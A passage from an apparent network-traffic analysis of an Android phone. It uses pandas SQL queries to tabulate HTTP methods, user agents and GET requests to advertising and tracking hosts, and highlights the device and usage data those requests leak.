            &lt;tr&gt;
              &lt;th&gt;
                2
              &lt;/th&gt;

              &lt;td&gt;
                61568
              &lt;/td&gt;

              &lt;td&gt;
                5228
              &lt;/td&gt;
            &lt;/tr&gt;

            &lt;tr&gt;
              &lt;th&gt;
                3
              &lt;/th&gt;

              &lt;td&gt;
                9760
              &lt;/td&gt;

              &lt;td&gt;
                993
              &lt;/td&gt;
            &lt;/tr&gt;

            &lt;tr&gt;
              &lt;th&gt;
                4
              &lt;/th&gt;

              &lt;td&gt;
                7712
              &lt;/td&gt;

              &lt;td&gt;
                5222
              &lt;/td&gt;
            &lt;/tr&gt;

            &lt;tr&gt;
              &lt;th&gt;
                5
              &lt;/th&gt;

              &lt;td&gt;
                4512
              &lt;/td&gt;

              &lt;td&gt;
                8253
              &lt;/td&gt;
            &lt;/tr&gt;

            &lt;tr&gt;
              &lt;th&gt;
                6
              &lt;/th&gt;

              &lt;td&gt;
                2368
              &lt;/td&gt;

              &lt;td&gt;
                995
              &lt;/td&gt;
            &lt;/tr&gt;

            &lt;tr&gt;
              &lt;th&gt;
                7
              &lt;/th&gt;

              &lt;td&gt;
                144
              &lt;/td&gt;

              &lt;td&gt;
                7276
              &lt;/td&gt;
            &lt;/tr&gt;

            &lt;tr&gt;
              &lt;th&gt;
                8
              &lt;/th&gt;

              &lt;td&gt;
                112
              &lt;/td&gt;

              &lt;td&gt;
                7275
              &lt;/td&gt;
            &lt;/tr&gt;

            &lt;tr&gt;
              &lt;th&gt;
                9
              &lt;/th&gt;

              &lt;td&gt;
              &lt;/td&gt;

              &lt;td&gt;
                NaN
              &lt;/td&gt;
            &lt;/tr&gt;
</code></pre>
</table>
</div>
<h3 id="http-connections">HTTP Connections</h3>
<h4 id="http-methods">HTTP Methods</h4>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.sql" data-lang=".sql">p_http_methods<span style="color:#666"> </span>=<span style="color:#666"> </span>pdsql.<span style="color:#447fcf">read_frame</span>(<span style="color:#ed9d13">&#34;&#34;&#34;
</span><span style="color:#ed9d13">    SELECT COUNT(request_method), request_method
</span><span style="color:#ed9d13">    FROM http
</span><span style="color:#ed9d13">    GROUP by request_method
</span><span style="color:#ed9d13">    ORDER by 1 DESC
</span><span style="color:#ed9d13">&#34;&#34;&#34;</span>,<span style="color:#666"> </span>con)<span style="color:#666">
</span><span style="color:#666"></span>p_http_methods.<span style="color:#447fcf">head</span>(<span style="color:#3677a9">100</span>)<span style="color:#666">
</span></code></pre></div><div class="table-responsive">
<table class="table">
                    <tr align="left">
                      <th>
                        Â 
                      </th>
<pre><code>                  &lt;th&gt;
                    Packets
                  &lt;/th&gt;

                  &lt;th&gt;
                    request_method
                  &lt;/th&gt;
                &lt;/tr&gt;

                &lt;tr&gt;
                  &lt;th&gt;0
                  &lt;/th&gt;

                  &lt;td&gt;
                    1345
                  &lt;/td&gt;

                  &lt;td&gt;
                    GET
                  &lt;/td&gt;
                &lt;/tr&gt;

                &lt;tr&gt;
                  &lt;th&gt;
                    1
                  &lt;/th&gt;

                  &lt;td&gt;
                    8
                  &lt;/td&gt;

                  &lt;td&gt;
                    POST
                  &lt;/td&gt;
                &lt;/tr&gt;
</code></pre>
</table>
</div>
<h4 id="user-agents">User agents</h4>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.sql" data-lang=".sql">p_user_agents<span style="color:#666"> </span>=<span style="color:#666"> </span>pdsql.<span style="color:#447fcf">read_frame</span>(<span style="color:#ed9d13">&#34;&#34;&#34;
</span><span style="color:#ed9d13">    SELECT COUNT(user_agent), user_agent
</span><span style="color:#ed9d13">    FROM http
</span><span style="color:#ed9d13">    GROUP by user_agent
</span><span style="color:#ed9d13">    ORDER by 1 DESC
</span><span style="color:#ed9d13">&#34;&#34;&#34;</span>,<span style="color:#666"> </span>con)<span style="color:#666">
</span><span style="color:#666"></span>p_user_agents.<span style="color:#447fcf">head</span>(<span style="color:#3677a9">100</span>)<span style="color:#666">
</span></code></pre></div><div class="table-responsive">
<table class="table">
                        <tr align="left">
                          <th>
                            Â 
                          </th>
<pre><code>                      &lt;th&gt;
                        No.
                      &lt;/th&gt;

                      &lt;th&gt;
                        user_agent
                      &lt;/th&gt;
                    &lt;/tr&gt;

                    &lt;tr&gt;
                      &lt;th&gt;0
                      &lt;/th&gt;

                      &lt;td&gt;
                        2388
                      &lt;/td&gt;

                      &lt;td&gt;
                        null (FlipboardProxy/1.1; +http://flipboard.com/browserproxy)
                      &lt;/td&gt;
                    &lt;/tr&gt;

                    &lt;tr&gt;
                      &lt;th&gt;
                        1
                      &lt;/th&gt;

                      &lt;td&gt;
                        1088
                      &lt;/td&gt;

                      &lt;td&gt;
                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100
                      &lt;/td&gt;
                    &lt;/tr&gt;

                    &lt;tr&gt;
                      &lt;th&gt;
                        2
                      &lt;/th&gt;

                      &lt;td&gt;
                        500
                      &lt;/td&gt;

                      &lt;td&gt;
                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de
                      &lt;/td&gt;
                    &lt;/tr&gt;

                    &lt;tr&gt;
                      &lt;th&gt;
                        3
                      &lt;/th&gt;

                      &lt;td&gt;
                        368
                      &lt;/td&gt;

                      &lt;td&gt;
                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30
                      &lt;/td&gt;
                    &lt;/tr&gt;

                    &lt;tr&gt;
                      &lt;th&gt;
                        4
                      &lt;/th&gt;

                      &lt;td&gt;
                        328
                      &lt;/td&gt;

                      &lt;td&gt;
                        Ultimate DayDream
                      &lt;/td&gt;
                    &lt;/tr&gt;

                    &lt;tr&gt;
                      &lt;th&gt;
                        5
                      &lt;/th&gt;

                      &lt;td&gt;
                        212
                      &lt;/td&gt;

                      &lt;td&gt;
                        Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0
                      &lt;/td&gt;
                    &lt;/tr&gt;

                    &lt;tr&gt;
                      &lt;th&gt;
                        6
                      &lt;/th&gt;

                      &lt;td&gt;
                        148
                      &lt;/td&gt;

                      &lt;td&gt;
                        SDK/4.0.2
                      &lt;/td&gt;
                    &lt;/tr&gt;

                    &lt;tr&gt;
                      &lt;th&gt;
                        7
                      &lt;/th&gt;

                      &lt;td&gt;
                        112
                      &lt;/td&gt;

                      &lt;td&gt;
                        Spotify/70400610 (6; 2; 7)
                      &lt;/td&gt;
                    &lt;/tr&gt;

                    &lt;tr&gt;
                      &lt;th&gt;
                        8
                      &lt;/th&gt;

                      &lt;td&gt;
                        72
                      &lt;/td&gt;

                      &lt;td&gt;
                        Dalvik/1.6.0 (Linux; U; Android 4.3.1; GT-N7000 Build/JLS36I)
                      &lt;/td&gt;
                    &lt;/tr&gt;

                    &lt;tr&gt;
                      &lt;th&gt;
                        9
                      &lt;/th&gt;

                      &lt;td&gt;
                        60
                      &lt;/td&gt;

                      &lt;td&gt;
                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 (Mobile; afma-sdk-a-v6.4.1)
                      &lt;/td&gt;
                    &lt;/tr&gt;

                    &lt;tr&gt;
                      &lt;th&gt;
                        10
                      &lt;/th&gt;

                      &lt;td&gt;
                        28
                      &lt;/td&gt;

                      &lt;td&gt;
                        android-async-http/1.3.1 (http://loopj.com/android-async-http)
                      &lt;/td&gt;
                    &lt;/tr&gt;

                    &lt;tr&gt;
                      &lt;th&gt;
                        11
                      &lt;/th&gt;

                      &lt;td&gt;
                        24
                      &lt;/td&gt;

                      &lt;td&gt;
                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100/4.3.1(18)/samsung/GT-N7000
                      &lt;/td&gt;
                    &lt;/tr&gt;

                    &lt;tr&gt;
                      &lt;th&gt;
                        12
                      &lt;/th&gt;

                      &lt;td&gt;
                        20
                      &lt;/td&gt;

                      &lt;td&gt;
                        com.google.android.youtube/5.3.32(Linux; U; Android 4.3.1; de_DE; GT-N7000 Build/JLS36I) gzip
                      &lt;/td&gt;
                    &lt;/tr&gt;

                    &lt;tr&gt;
                      &lt;th&gt;
                        13
                      &lt;/th&gt;

                      &lt;td&gt;
                        8
                      &lt;/td&gt;

                      &lt;td&gt;
                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 (Mobile; afma-sdk-a-v4.1.1)
                      &lt;/td&gt;
                    &lt;/tr&gt;

                    &lt;tr&gt;
                      &lt;th&gt;
                        14
                      &lt;/th&gt;

                      &lt;td&gt;
                        8
                      &lt;/td&gt;

                      &lt;td&gt;
                        android-async-http/1.4.1 (http://loopj.com/android-async-http)
                      &lt;/td&gt;
                    &lt;/tr&gt;

                    &lt;tr&gt;
                      &lt;th&gt;
                        15
                      &lt;/th&gt;

                      &lt;td&gt;
                        8
                      &lt;/td&gt;

                      &lt;td&gt;
                        com.google.android.youtube/5.3.32(Linux; U; Android 4.3.1; de_DE; GT-N7000 Build/JLS36I)
                      &lt;/td&gt;
                    &lt;/tr&gt;

                    &lt;tr&gt;
                      &lt;th&gt;
                        16
                      &lt;/th&gt;

                      &lt;td&gt;
                        4
                      &lt;/td&gt;

                      &lt;td&gt;
                        Android
                      &lt;/td&gt;
                    &lt;/tr&gt;

                    &lt;tr&gt;
                      &lt;th&gt;
                        17
                      &lt;/th&gt;

                      &lt;td&gt;
                        4
                      &lt;/td&gt;

                      &lt;td&gt;
                        GoogleAnalytics/1.4.2 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I)
                      &lt;/td&gt;
                    &lt;/tr&gt;

                    &lt;tr&gt;
                      &lt;th&gt;
                        18
                      &lt;/th&gt;

                      &lt;td&gt;
                        4
                      &lt;/td&gt;

                      &lt;td&gt;
                        android-async-http/1.4.3 (http://loopj.com/android-async-http)
                      &lt;/td&gt;
                    &lt;/tr&gt;

                    &lt;tr&gt;
                      &lt;th&gt;
                        19
                      &lt;/th&gt;

                      &lt;td&gt;
                        4
                      &lt;/td&gt;

                      &lt;td&gt;
                        stagefright/1.2 (Linux;Android 4.3.1)
                      &lt;/td&gt;
                    &lt;/tr&gt;

                    &lt;tr&gt;
                      &lt;th&gt;
                        20
                      &lt;/th&gt;

                      &lt;td&gt;
                      &lt;/td&gt;

                      &lt;td&gt;
                        None
                      &lt;/td&gt;
                    &lt;/tr&gt;
</code></pre>
</table>
</div>
<h4 id="get-requests">GET Requests</h4>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.sql" data-lang=".sql">p3<span style="color:#666"> </span>=<span style="color:#666"> </span>pdsql.<span style="color:#447fcf">read_frame</span>(<span style="color:#ed9d13">&#34;&#34;&#34;
</span><span style="color:#ed9d13">    SELECT h.frame_number, h.ip_dst, d.dns_query, h.request_method, h.request_uri, h.user_agent FROM http AS  h
</span><span style="color:#ed9d13">    JOIN dns AS d ON h.ip_dst = d.dns_response
</span><span style="color:#ed9d13">    WHERE lower(h.request_method) == &#39;get&#39; AND
</span><span style="color:#ed9d13">        -- Filter all rubish
</span><span style="color:#ed9d13">        (h.request_uri NOT LIKE &#39;%.gif&#39;  AND
</span><span style="color:#ed9d13">         h.request_uri NOT LIKE &#39;%.jpg&#39;  AND
</span><span style="color:#ed9d13">         h.request_uri NOT LIKE &#39;%.jpeg&#39; AND
</span><span style="color:#ed9d13">         h.request_uri NOT LIKE &#39;%.png&#39;  AND
</span><span style="color:#ed9d13">         h.request_uri NOT LIKE &#39;%.gif&#39;  AND
</span><span style="color:#ed9d13">         h.request_uri NOT LIKE &#39;%.css&#39;  AND
</span><span style="color:#ed9d13">         h.request_uri NOT LIKE &#39;%.html&#39; AND
</span><span style="color:#ed9d13">         h.request_uri NOT LIKE &#39;%.js&#39;)
</span><span style="color:#ed9d13">    AND
</span><span style="color:#ed9d13">        (d.dns_query NOT LIKE &#39;%amazon%&#39;   AND
</span><span style="color:#ed9d13">         d.dns_query NOT LIKE &#39;%fahrinfo%&#39; AND
</span><span style="color:#ed9d13">         d.dns_query NOT LIKE &#39;%faz.net%&#39;  AND
</span><span style="color:#ed9d13">         d.dns_query NOT LIKE &#39;%heute.de%&#39; AND
</span><span style="color:#ed9d13">         d.dns_query NOT LIKE &#39;%twitter%&#39;  AND
</span><span style="color:#ed9d13">         d.dns_query NOT LIKE &#39;%sueddeutsche%&#39;)
</span><span style="color:#ed9d13">
</span><span style="color:#ed9d13">    GROUP by h.request_uri
</span><span style="color:#ed9d13">    ORDER by d.dns_query
</span><span style="color:#ed9d13">&#34;&#34;&#34;</span>,<span style="color:#666"> </span>con)<span style="color:#666">
</span><span style="color:#666"></span>p3.<span style="color:#447fcf">head</span>(<span style="color:#3677a9">500</span>)<span style="color:#666">
</span></code></pre></div><div class="table-responsive">
<table class="table">
                            <tr align="left">
                              <th style="width: 30px;" valign="top">
                                Â 
                              </th>
<pre><code>                          &lt;th style=&quot;word-wrap: break-word; width: 200px;&quot; valign=&quot;top&quot;&gt;
                            destination
                          &lt;/th&gt;

                          &lt;th style=&quot;word-wrap: break-word;&quot;&gt;
                            request_uri
                          &lt;/th&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;0
                          &lt;/th&gt;

                          &lt;td&gt;
                            adfarm1.adition.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /js?wp_id=2501167
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            1
                          &lt;/th&gt;

                          &lt;td&gt;
                            ads.yahoo.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /cms/v1?esig=1~b9bada6fffbf45c1ffda7783879fb5715486894a&amp;nwid=10000922750&amp;sigv=1
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            2
                          &lt;/th&gt;

                          &lt;td&gt;
                            adx.fe02-sl.manage.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /2/win?_bi=4bq4p7Cn9VXzc3XTEz1wocSUpKU%3D&amp;_ei=10411&amp;_ecost1000000_adx=Utq7uQAM5S8K3tKEAABJJbJHrnHwdXabfQqUjg&amp;-mf=2&amp;-fi=86400&amp;age=0&amp;app=&amp;appi=&amp;appv=&amp;pt=app&amp;pi=&lt;span style=&quot;background-color: #00ff00;&quot;&gt;com.iudesk.android.photo.edito&lt;/span&gt;r&amp;p=com.iudesk.android.photo.editor&amp;zid=&amp;pcat=&amp;lat=&amp;lon=&amp;country=DEU&amp;gender=%3F&amp;isp=carrier&amp;netspd=dial-up&amp;model=&lt;span style=&quot;background-color: #00ff00;&quot;&gt;gt-n7000&lt;/span&gt;&amp;&lt;span style=&quot;background-color: #00ff00;&quot;&gt;os=Android&amp;osv=4.3.&lt;/span&gt;1&amp;region=&amp;zip=&amp;dma=0&amp;si=4&amp;_ua=&lt;span style=&quot;background-color: #00ff00;&quot;&gt;Mozilla%2F5.0+%28Linux%3B+U%3B+Android+4.3.1&lt;/span&gt;%3B+de-de%3B+GT-N7000+Build%2FJLS36I%29+AppleWebKit%2F534.30+%28KHTML%2C+like+Gecko%29+Version%2F4.0+Mobile+Safari%2F534.30+%28Mobile%3B+afma-sdk-a-v6.4.1%29%2Cgzip%28gfe%29&amp;_uh=xid%3ACAESEDLJ4tolP4xNFA9ZOWuBZNM&amp;idx=2&amp;ai=209646&amp;_bid=0.00117&amp;sub5=fe02-sl
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            3
                          &lt;/th&gt;

                          &lt;td&gt;
                            adx.fe08-sl.manage.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /2/win?_bi=HOq1iXrqnKD4Wtb8FdrWjdqewso%3D&amp;_ei=10411&amp;_ecost1000000_adx=Utq7BgAGYa0K3sdHAAAWKarWI_oJGLrPHIcJKg&amp;-mf=2&amp;-fi=86400&amp;age=0&amp;app=&amp;appi=&amp;appv=&amp;pt=app&amp;pi=com.iudesk.android.photo.editor&amp;p=com.iudesk.android.photo.editor&amp;zid=&amp;pcat=&amp;lat=&amp;lon=&amp;country=DEU&amp;gender=%3F&amp;isp=carrier&amp;netspd=dial-up&amp;model=gt-n7000&amp;os=Android&amp;osv=4.3.1&amp;region=&amp;zip=&amp;dma=0&amp;si=4&amp;_ua=Mozilla%2F5.0+%28Linux%3B+U%3B+Android+4.3.1%3B+de-de%3B+GT-N7000+Build%2FJLS36I%29+AppleWebKit%2F534.30+%28KHTML%2C+like+Gecko%29+Version%2F4.0+Mobile+Safari%2F534.30+%28Mobile%3B+afma-sdk-a-v6.4.1%29%2Cgzip%28gfe%29&amp;_uh=xid%3ACAESEDLJ4tolP4xNFA9ZOWuBZNM&amp;idx=1&amp;ai=209646&amp;_bid=0.00117&amp;sub5=fe08-sl
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            4
                          &lt;/th&gt;

                          &lt;td&gt;
                            android.clients.google.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /generate_204
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            5
                          &lt;/th&gt;

                          &lt;td&gt;
                            andropit.ivwbox.de
                          &lt;/td&gt;

                          &lt;td&gt;
                            /cgi-bin/ivw/CP/forum;?r=&amp;d=59106.27518314868
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            6
                          &lt;/th&gt;

                          &lt;td&gt;
                            api.geo.kontagent.net
                          &lt;/td&gt;

                          &lt;td&gt;
                            /api/v1/0d868f5ce9434bdcafd869f2b11adae8/cpu/?os=android_18&amp;v_maj=4.4.2.254&amp;d=&lt;span style=&quot;color: #000000; background-color: #00ff00;&quot;&gt;GT-N7000&lt;/span&gt;&amp;ts=1390065565&amp;s=218949477293337144&amp;c=o2+-+de&amp;kt_v=a1.3.1&amp;m=samsung
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            7
                          &lt;/th&gt;

                          &lt;td&gt;
                            api.geo.kontagent.net
                          &lt;/td&gt;

                          &lt;td&gt;
                            /api/v1/0d868f5ce9434bdcafd869f2b11adae8/evt/?n=Keyboard_Average_Daily_Time&amp;ts=1390065565&amp;s=218949477293337144&amp;kt_v=a1.3.1&amp;st1=KeyboardUses
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            8
                          &lt;/th&gt;

                          &lt;td&gt;
                            api.geo.kontagent.net
                          &lt;/td&gt;

                          &lt;td&gt;
                            /api/v1/0d868f5ce9434bdcafd869f2b11adae8/evt/?n=&lt;span style=&quot;background-color: #00ff00;&quot;&gt;Keyboard_Total_Daily_Time&amp;ts=1390065565&amp;s=218949477293337144&amp;kt_v=a1.3.1&amp;st1=KeyboardUses&lt;/span&gt;
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            9
                          &lt;/th&gt;

                          &lt;td&gt;
                            api.geo.kontagent.net
                          &lt;/td&gt;

                          &lt;td&gt;
                            /api/v1/0d868f5ce9434bdcafd869f2b11adae8/evt/?n=Keyboard_Total_Daily_Uses&amp;ts=1390065565&amp;s=218949477293337144&amp;kt_v=a1.3.1&amp;st1=KeyboardUses
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            10
                          &lt;/th&gt;

                          &lt;td&gt;
                            api.geo.kontagent.net
                          &lt;/td&gt;

                          &lt;td&gt;
                            /api/v1/0d868f5ce9434bdcafd869f2b11adae8/pgr/?ts=1390065565&amp;s=218949477293337144&amp;kt_v=a1.3.1
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            11
                          &lt;/th&gt;

                          &lt;td&gt;
                            api.geo.kontagent.net
                          &lt;/td&gt;

                          &lt;td&gt;
                            /api/v1/0d868f5ce9434bdcafd869f2b11adae8/pgr/?ts=1390065632&amp;s=218949477293337144&amp;kt_v=a1.3.1
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            12
                          &lt;/th&gt;

                          &lt;td&gt;
                            api.tunigo.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /v3/space/genres?order=desc&amp;field=releaseDate_tdt&amp;suppress404=1&amp;product=&amp;per_page=100&amp;page=0&amp;suppress_response_codes=1&amp;region=DE
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            13
                          &lt;/th&gt;

                          &lt;td&gt;
                            apresolve.spotify.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            14
                          &lt;/th&gt;

                          &lt;td&gt;
                            bh.contextweb.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /bh/rtset?pid=557477&amp;ev=&amp;rurl=http%3A%2F%2Fs.amazon-adsystem.com%2Fecm3%3Fid%3D%25%25ENCRYPTED_VGUID%25%25%26ex%3Dpulsepoint.com
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            15
                          &lt;/th&gt;

                          &lt;td&gt;
                            bid.openx.net
                          &lt;/td&gt;

                          &lt;td&gt;
                            /cm?pid=e818ca1e-0c23-caa8-0dd3-096b0ada08b7&amp;dst=http%3A%2F%2Fs.amazon-adsystem.com%2Fecm3%3Fex%3Dopenx.com%26id%3D
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            16
                          &lt;/th&gt;

                          &lt;td&gt;
                            cdn.flipboard.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /flipmag?url=http%3A%2F%2Fcdn.flipboard.com%2Fstern.de%2Finlineaml_3Dtrue%2F26e36cfec35abad0c372f74d1c472f84912677b0%2F849604d1e7bde34b05ed7967d066a6ccdcdb400e%2Farticle.html&amp;campaignTarget=flipboard%2Fmix%252F30924883&amp;partner=rss-stern&amp;tml=templates%2Fiphone%2Fgeneric-9690bc.html&amp;section=flipboard%2Fmix%252F30924883&amp;fallbackTml=templates%2Fiphone%2Fgeneric-9690bc.html&amp;formFactor=phone
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            17
                          &lt;/th&gt;

                          &lt;td&gt;
                            csi.gstatic.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /csi?v=3&amp;s=gmob&amp;action=&amp;rt=crf.1146,cri.3167
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            18
                          &lt;/th&gt;

                          &lt;td&gt;
                            csi.gstatic.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /csi?v=3&amp;s=gmob&amp;action=&amp;rt=crf.12,cri.1029
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            19
                          &lt;/th&gt;

                          &lt;td&gt;
                            d.shareaholic.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /dough/1.0/mixer.gif?p_name=AN&amp;p_id=7789992519211014773
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            20
                          &lt;/th&gt;

                          &lt;td&gt;
                            d.shareaholic.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /dough/1.0/oven/?referrer=http%3A%2F%2Fflipboard.com%2Fredirect%3Furl%3Dhttp%253A%252F%252Fintelcrawler.com%252Fabout%252Fpress07&amp;platform=website
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            21
                          &lt;/th&gt;

                          &lt;td&gt;
                            de.ioam.de
                          &lt;/td&gt;

                          &lt;td&gt;
                            /tx.io?st=andropit&amp;cp=forum&amp;pt=CP&amp;rf=&amp;r2=&amp;ur=www.androidpit.de&amp;xy=800x1280x32&amp;lo=DE%2Fn.a.&amp;cb=0001&amp;vr=303&amp;id=2gf46s&amp;lt=1390123647701&amp;ev=&amp;cs=eytiao&amp;mo=1
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            22
                          &lt;/th&gt;

                          &lt;td&gt;
                            de.ioam.de
                          &lt;/td&gt;

                          &lt;td&gt;
                            /tx.io?st=mobfaz&amp;cp=222F000006E6&amp;sv=mo&amp;co=kommentar&amp;pt=CP&amp;rf=&amp;r2=&amp;ur=m.faz.net&amp;xy=800x1280x32&amp;lo=DE%2Fn.a.&amp;cb=0001&amp;vr=303&amp;id=y6dim4&amp;lt=1390147720004&amp;ev=&amp;cs=o2c483&amp;mo=1
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            23
                          &lt;/th&gt;

                          &lt;td&gt;
                            de.ioam.de
                          &lt;/td&gt;

                          &lt;td&gt;
                            /tx.io?st=mobfaz&amp;cp=222F000006E7&amp;sv=mo&amp;co=kommentar&amp;pt=CP&amp;rf=&amp;r2=&amp;ur=m.faz.net&amp;xy=800x1280x32&amp;lo=DE%2Fn.a.&amp;cb=0004&amp;vr=303&amp;id=vngwhf&amp;lt=1390051123113&amp;ev=&amp;cs=aooae9&amp;mo=1
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            24
                          &lt;/th&gt;

                          &lt;td&gt;
                            de.ioam.de
                          &lt;/td&gt;

                          &lt;td&gt;
                            /tx.io?st=mobheute&amp;cp=%2FZH%2Fheutede&amp;co=%2Fbeitrag%2FBlitzeinschlag%3A.Christus-Statue.verliert.Finger%2F31536732&amp;pt=CP&amp;rf=&amp;r2=&amp;ur=m.heute.de&amp;xy=800x1280x32&amp;lo=DE%2Fn.a.&amp;cb=0007&amp;vr=303&amp;id=vngwhf&amp;lt=1390051093712&amp;ev=&amp;cs=dbhkky&amp;mo=1
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            25
                          &lt;/th&gt;

                          &lt;td&gt;
                            de.ioam.de
                          &lt;/td&gt;

                          &lt;td&gt;
                            /tx.io?st=mobsued&amp;cp=spracheDE%2FformatTXT%2FerzeugerRED%2FhomepageNO%2FauslieferungMOB%2FappNO%2FpaidNO%2FinhaltDIGITAL&amp;pt=CP&amp;rf=flipboard.com&amp;r2=http%3A%2F%2Fflipboard.com%2Fredirect%3Furl%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Fdigital%252Fstreamseite-redtube-loechriges-gutachten-bringt-porno-abmahner-in-bedraengnis-1.1866025&amp;ur=www.sueddeutsche.de&amp;xy=800x1280x32&amp;lo=DE%2Fn.a.&amp;cb=0004&amp;vr=303&amp;id=vngwhf&amp;lt=1390051326056&amp;ev=&amp;cs=cn5je0&amp;mo=0
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            26
                          &lt;/th&gt;

                          &lt;td&gt;
                            de.ioam.de
                          &lt;/td&gt;

                          &lt;td&gt;
                            /tx.io?st=mobsued&amp;cp=spracheDE%2FformatTXT%2FerzeugerRED%2FhomepageNO%2FauslieferungMOB%2FappNO%2FpaidNO%2FinhaltKARRIERE&amp;pt=CP&amp;rf=flipboard.com&amp;r2=http%3A%2F%2Fflipboard.com%2Fredirect%3Furl%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Fkarriere%252Fstudie-hunderttausende-akademiker-arbeiten-fuer-niedrigloehne-1.1866212&amp;ur=www.sueddeutsche.de&amp;xy=800x1280x32&amp;lo=DE%2Fn.a.&amp;cb=0001&amp;vr=303&amp;id=y6dim4&amp;lt=1390147627064&amp;ev=&amp;cs=nkfe26&amp;mo=0
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            27
                          &lt;/th&gt;

                          &lt;td&gt;
                            de.ioam.de
                          &lt;/td&gt;

                          &lt;td&gt;
